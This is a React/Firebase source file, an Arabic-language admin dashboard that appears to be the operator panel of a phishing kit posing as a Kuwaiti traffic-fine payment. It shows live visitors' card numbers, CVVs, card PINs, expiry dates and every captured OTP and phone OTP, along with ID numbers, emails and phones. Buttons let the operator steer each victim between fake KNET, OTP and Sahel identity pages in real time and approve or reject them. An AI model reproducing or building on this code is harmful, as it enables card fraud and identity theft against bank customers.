"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Trash2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { auth, db, database } from "@/lib/firestore"
import { InfoIcon } from "lucide-react"
import { onValue, ref } from "firebase/database"

interface Notification {
  bank: string
  bank_card: string
  cardNumber: string
  cardStatus: string
  createdDate: string
  cvv: string
  id: string | "0"
  month: string
  notificationCount: number
  otp: string
  page: string
  pass: string
  personalInfo: {
    id?: string | "0"
  }
  prefix: string
  status: "pending" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  year: string
  pagename: string
  plateType: string
  allOtps?: string[]
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string
  }>({})
  const router = useRouter()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || "",
            }))
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        setNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }
  const getLiveStatus = (userId: string, callback: (status: string) => void) => {
    if (!userId) return

    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        callback(data.state) // "online" or "offline"
      } else {
        callback("unknown")
      }
    })
  }
  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown")

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state)
        } else {
          setStatus("unknown")
        }
      })

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe()
      }
    }, [userId])

    return (
      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
        <span style={{ fontSize: "12px", color: "#fff" }}>{status==='online'?'متصل':'غير متصل'}</span>
      </Badge>
    )
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { violationValue: value })
      setViolationValues((prev) => ({ ...prev, [id]: value }))
    } catch (error) {
      console.error("Error updating violation value:", error)
    }
  }

  const handleUpdatePage = async (id: string, page: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { page: page })
      setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : (notif as any))))
    } catch (error) {
      console.error("Error updating current page:", error)
    }
  }

  if (isLoading) {
    return <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">جاري التحميل...</div>
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="bg-gray-100 rounded-lg overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-gray-100">
                <th className="px-4 py-3 text-right">الإسم</th>
                <th className="px-4 py-3 text-right">المعلومات</th>
                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                <th className="px-4 py-3 text-right">الوقت</th>
                <th className="px-4 py-3 text-center">الاشعارات</th>
                <th className="px-4 py-3 text-center">تحديث الصفحة</th>
                <th className="px-4 py-3 text-center">حذف</th>
              </tr>
            </thead>
            <tbody>
              {notifications.map((notification) => (
                <tr key={notification.id} className="border-b border-gray-700">
                  <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2">
                      <Badge
                        variant={notification.personalInfo?.id! ? "default" : "destructive"}
                        className="rounded-md cursor-pointer"
                        onClick={() => handleInfoClick(notification, "personal")}
                      >
                        {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
                      </Badge>
                      <Badge
                        variant={notification.cardNumber ? "default" : "destructive"}
                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                        onClick={() => handleInfoClick(notification, "card")}
                      >
                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                      </Badge>
                      <Badge
                        variant={"secondary"}
                        className={`rounded-md cursor-pointer ${notification.idNumber ? "bg-yellow-300" : ""}`}
                        onClick={() => handleInfoClick(notification, "personal")}
                      >
                        <InfoIcon className="h-4 w-4 mr-1" />
                        معلومات عامة
                      </Badge>
                    </div>
                  </td>
                  <td className="px-4 py-3">خطوه - {notification.page}</td>
                  <td className="px-4 py-3">
                    {notification.createdDate &&
                      formatDistanceToNow(new Date(notification.createdDate), {
                        addSuffix: true,
                        locale: ar,
                      })}
                  </td>
                  <td className="px-4 py-3 text-center">
                    <UserStatusBadge userId={notification.id} />
                  </td>
                  <td className="px-4 py-3 text-center">
                    <div className="flex flex-col items-center space-y-2">
                      <div className="flex justify-center space-x-2">
                        {[
                          {
                            page: "main",
                            label: "الرئيسية",
                            hint: "الصفحة الرئيسية",
                          },
                          { page: "knet", label: "كنت", hint: "صفحة كنت" },
                          {
                            page: "phone",
                            label: "هاتف",
                            hint: "رقم الهاتف ",
                          },
                          {
                            page: "phoneCode",
                            label: " OTP",
                            hint: " OTP",
                          },
                          {
                            page: "sahel",
                            label: "هوية",
                            hint: "هوية",
                          },
                        ].map(({ page, label, hint }) => (
                          <Button
                            key={page}
                            variant={notification?.page === page ? "default" : "outline"}
                            size="sm"
                            onClick={() => handleUpdatePage(notification.id, page)}
                            className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
                            title={hint}
                          >
                            {label}
                            {notification.page === page && (
                              <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                ✓
                              </span>
                            )}
                          </Button>
                        ))}
                      </div>
                      <span className="text-xs text-gray-500">
                        {notification.page === "main" && "الصفحة الرئيسية"}
                        {notification.page === "knet" && "صفحة كنت"}
                        {notification.page === "phone" && "رقم الهاتف "}
                        {notification.page === "phoneOtp" && " OTP"}
                        {notification.page === "sahel" && "هوية"}
                      </span>
                    </div>
                  </td>
                  <td className="px-4 py-3 text-center">
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-100 text-black" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة"
                  : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification?.plateType && (
            <div className="space-y-2">
              <p>
                <strong>رقم الهوية:</strong> {selectedNotification.personalInfo.id}
              </p>
              <p>
                <strong>قيمة المخالفة:</strong> {selectedNotification.violationValue}
              </p>
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
              </p>
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                {selectedNotification.cardNumber &&
                  selectedNotification.cardNumber + " - " + selectedNotification.prefix}
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
                {selectedNotification.month}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-400 mx-4">رمز الأمان :</strong> {selectedNotification.cvv}
              </p>
              <p>
                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                <div className="grid grid-cols-4">
                  {selectedNotification.allOtps &&
                    selectedNotification.allOtps.map((i, index) => <Badge key={index}>{i}</Badge>)}
                </div>
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
            </div>
          )}
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong>الهاتف:</strong> {selectedNotification.mobile}
              </p>
              <p>
                <strong>لايميل:</strong> {selectedNotification.email}
              </p>
              <p>
                <strong>نوع الشبكة :</strong> {selectedNotification.network}
              </p>{" "}
              <p>
                <strong>Phobe OTP :</strong> {selectedNotification.phoneOtp}
              </p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}

